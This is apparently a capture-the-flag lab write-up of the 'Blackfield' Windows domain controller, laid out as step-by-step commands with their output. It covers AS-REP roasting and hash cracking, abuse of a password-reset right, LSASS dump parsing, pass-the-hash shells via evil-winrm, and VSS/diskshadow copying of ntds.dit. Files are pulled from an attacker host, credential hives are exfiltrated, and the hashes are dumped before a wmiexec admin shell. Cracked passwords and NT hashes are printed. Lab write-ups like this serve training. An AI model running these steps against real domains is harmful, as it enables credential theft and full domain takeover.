## Blackfield

### Lab Details 

- Difficulty: Hard
- Type: Hash Cracking, Backup Operator Group, AD, Windows

#### Enumeration
- run `nmap`
- run `enum4linux-ng` anonymous scan
```bash
 ===========================================================
|    Domain Information via SMB session for 10.129.31.78    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: BLACKFIELD
DNS domain: BLACKFIELD.local
FQDN: DC01.BLACKFIELD.local
Derived membership: domain member
Derived domain: BLACKFIELD

 ===================================================
|    Domain Information via RPC for 10.129.31.78    |
 ===================================================
[+] Domain: BLACKFIELD
[+] Domain SID: S-1-5-21-4194615774-2175524697-3563712290
[+] Membership: domain member

 ===============================================
|    OS Information via RPC for 10.129.31.78    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null
```
- run `smbmap` anonymous scan
```bash
 smbmap -H 10.129.31.78 -u "a" -p ""
[+] Guest session   	IP: 10.129.31.78:445	Name: blackfield.local                                  
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	profiles$                                         	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
```
- we have read access as anonymous to `profile$` 
```bash
$ smbmap -H 10.129.31.78 -u "a" -p "" -r "profiles$"
[+] Guest session   	IP: 10.129.31.78:445	Name: blackfield.local                                  
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	profiles$                                         	READ ONLY	
	.\profiles$\*
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	.
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	..
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AAlleni
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABarteski
<SNIP>
```
- fetch everything from remote in `profiles$` share 
- checking the directory we see that its only contains empty directories with usernames
```bash
$ smbclient //10.129.31.78/profiles$
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
smb: \> ls
  .                                   D        0  Wed Jun  3 11:47:12 2020
  ..                                  D        0  Wed Jun  3 11:47:12 2020
  AAlleni                             D        0  Wed Jun  3 11:47:11 2020
  ABarteski                           D        0  Wed Jun  3 11:47:11 2020
  ABekesz                             D        0  Wed Jun  3 11:47:11 2020
  ABenzies                            D        0  Wed Jun  3 11:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 11:47:11 2020
  AChampken                           D        0  Wed Jun  3 11:47:11 2020
  <SNIP>
```
- save the directory names into a file then filter only the names, save it to a file
```bash
$ grep -E '^(├|└)' users.txt | sed 's/^[^ ]* //' > usernames.txt
```
- we can attempt to perform an `ASREP Roasting attack` with `GetNPUsers`
```bash
$ GetNPUsers.py blackfield.local/ -no-pass -usersfile usernames.txt -dc-ip 10.129.31.78 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN' > output.txt
```
- check the output and we get the `support` user's hash
```bash
$ cat output.txt 
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:e56001d5032f5ca25fadac629a7e2531$1ac5cb4a5285857615c1005f3c62220b680bcfb1b602bf5e833b606905fb606051e13a762686e42e4bcd500c038ff0b919251226494bdddb11b1d1fa139740ce578fbe5acabddf5eef2a7011fe83b2204c7aaf97cc5dfb4bf086d5d5e8ad4ab0240a8c81cc0c79dc2b0f166c094d377cc9735549cf9f067a567eb3c8aa04ae2e1c2c84335fd75d922f52ab734976789dfdde7e4667db0d8636566d9f65e77915aeba1e44299f927c17d19b03676c342c19d76b62ae1b303c3e7b5868966eed8c6891ed5acc12888159bff1b1c62a0df984a244d3c405e43856e74eede434779908f76092cd3e1ac00ae1fbbf5c10edb1c1dfb980
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```
- decrypt with `hashcat`
```bash
$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
#00^BlackKnight
```
- we get the credential for user `support : #00^BlackKnight`
```bash
$ nxc smb blackfield.local -u support -p '#00^BlackKnight'
SMB         10.129.31.78    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.31.78    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```
- we see the computer name for target is `DC01`, which means we are dealing with the domain controller
- add `dc01.blackfield.local` to `/etc/hosts`
![[support bloodhound.png]]
- as `support` user we have `ForChangePassword` right over `AUDIT2020`
- get a `tgt` for `support`
```bash
$ impacket-getTGT blackfield.local/support:'#00^BlackKnight'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in support.ccache
```
- use `bloodyAD` to change the password
```bash
$ export KRB5CCNAME=../support.ccache; python3 bloodyAD.py -d blackfield.local -k --host "dc01.blackfield.local" set password "AUDIT2020" 'password123!'
WARNING:kerbad:Clock skew detected. Adjusting local time by 7:59:59.830329. Retrying operation.
[+] Password changed successfully!
```
- confirm that the password has been changed and we have access as `audit2020`
```bash
$ nxc smb blackfield.local -u audit2020 -p 'password123!'

SMB         10.129.31.78    445    DC01             [*] Windows 10 / erver 2019 uild 17763 x64 name01 domainC.local signingrue v1alse

         10.129.31.78    445    D01             [] .local\audit2020password123
```
- check `smb` again, we see that we have read access to the `forensic` share
```bash
$ nxc smb blackfield.local -u audit2020 -p 'password123!' --shares
SMB         10.129.31.78    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.31.78    445    DC01             [+] BLACKFIELD.local\audit2020:password123! 
SMB         10.129.31.78    445    DC01             [*] Enumerated shares
SMB         10.129.31.78    445    DC01             Share           Permissions     Remark
SMB         10.129.31.78    445    DC01             -----           -----------     ------
SMB         10.129.31.78    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.31.78    445    DC01             C$                              Default share
SMB         10.129.31.78    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.31.78    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.31.78    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.31.78    445    DC01             profiles$       READ            
SMB         10.129.31.78    445    DC01             SYSVOL          READ            Logon server share 
```
- we are interested in the `lsass.zip` in the `forensic` share since it contains user hashses
```bash
$ unzip lsass.zip 
Archive:  lsass.zip
  inflating: lsass.DMP 
```
- use `pypykatz` to dump credential
```bash
$ pypykatz lsa minidump lsass.DMP > cred.dump
INFO:pypykatz:Parsing file lsass.DMP
```
- check the dump file
```bash
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
<SNIP>
```
- we the see the `NT hash` of the `svc_backup` user
```bash
$ nxc smb 10.129.31.78 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.129.31.78    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.31.78    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
```
- check if the hash is valid
- check if we have `winrm` access
```bash
$ nxc winrm 10.129.31.78 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d --verbose
[00:49:35] INFO     Socket info: host=10.129.31.78, hostname=10.129.31.78, kerberos=False, ipv6=False, link-local ipv6=False                           connection.py:160
WINRM       10.129.31.78    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.129.31.78    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```
#### Initial Foothold 
- use `evil-winrm` to get access to target
```bash
$ evil-winrm -i 10.129.31.78 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

#### Lateral Movement (If any)

#### Privilege Escalation
- since we are the `backup user` we are allowed to  create a snapshot with
`Volume Shadow Copy Service (VSS)`
- we can create a snapshot of the file system and make a copy of the `ntds.dit` file which will contain all hashes and secrets stored in the domain.
- first construct a template containing steps of instructions for `diskshadow`
```powershell
SET VERBOSE ON
set context persistent nowriters
set metadata C:\windows\temp\meta.cab
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
- then load the script to target
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wget http://10.10.14.82:8000/shadow.script -O shadow.script
*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/2/2025   8:56 AM            178 shadow.script
```
- run `diskshadow` with the script
```

*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s shadow.script
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  11/2/2025 8:56:13 AM

-> SET VERBOSE ON
-> set context persistent nowriters
-> set metadata C:\windows\temp\meta.cab
-> begin backup
-> add volume C: alias cdrive
-> create

Alias cdrive for shadow ID {5a806c54-5aa7-4ac9-b973-12e6a350e747} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {29cc251a-2ed1-4eab-a541-1b07b63e3441} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file DisCB13.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {29cc251a-2ed1-4eab-a541-1b07b63e3441}

	* Shadow copy ID = {5a806c54-5aa7-4ac9-b973-12e6a350e747}		%cdrive%
		- Shadow copy set: {29cc251a-2ed1-4eab-a541-1b07b63e3441}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 11/2/2025 8:56:15 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %cdrive% F:
-> %cdrive% = {5a806c54-5aa7-4ac9-b973-12e6a350e747}
The shadow copy was successfully exposed as F:\.
-> end backup
-> exit
```
- copy the `NTDS.dit`file from `F:\Windows\NTDS `to the current directory, using backup mode to bypass any locks
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /B F:\Windows\NTDS .ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, November 2, 2025 8:56:33 AM
   Source : F:\Windows\NTDS\
     Dest : C:\Users\svc_backup\Documents\.ntds.dit\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------
<SNIP>
```
- export `SAM` & `SYSTEM` registry hives to file format
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\system system; reg save hklm\sam sam
The operation completed successfully.

The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/2/2025   2:50 AM                .ntds.dit
-a----        11/2/2025   8:56 AM          45056 sam
-a----        11/2/2025   8:56 AM            178 shadow.script
-a----        11/2/2025   8:56 AM       17580032 system

```
- compress the files for ease of download
```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Compress-Archive -path sam,system,.ntds.dit -dest dump.zip
*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/2/2025   2:50 AM                .ntds.dit
-a----        11/2/2025   8:57 AM        8525528 dump.zip
-a----        11/2/2025   8:56 AM          45056 sam
-a----        11/2/2025   8:56 AM            178 shadow.script
-a----        11/2/2025   8:56 AM       17580032 system


*Evil-WinRM* PS C:\Users\svc_backup\Documents> download dump.zip
                                        
Info: Downloading C:\Users\svc_backup\Documents\dump.zip to dump.zip
                                        
Info: Download successful!
```
- unzip the dump
```bash
$ unzip dump.zip
Archive:  dump.zip
warning:  dump.zip appears to use backslashes as path separators
  inflating: .ntds.dit/edb.chk       
  inflating: .ntds.dit/edb.log       
  inflating: .ntds.dit/edb00004.log  
  inflating: .ntds.dit/edb00005.log  
  inflating: .ntds.dit/edbres00001.jrs  
  inflating: .ntds.dit/edbres00002.jrs  
  inflating: .ntds.dit/edbtmp.log    
  inflating: .ntds.dit/ntds.dit      
  inflating: .ntds.dit/ntds.jfm      
  inflating: .ntds.dit/temp.edb      
  inflating: sam                     
  inflating: system        
```
- dump the hash using `impacket-secretsdump`
```bash
$ impacket-secretsdump -sam sam -system system -ntds ntds.dit local
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
<SNIP>
```
- get admin's hash
```bash
$ cat hashes.dump | grep Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1
```
- get remote shell access as admin using `wmiexec`
```bash
$ impacket-wmiexec 'Administrator@10.129.31.78' -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
blackfield\administrator
```

#### Resources

#### Lesson Learned
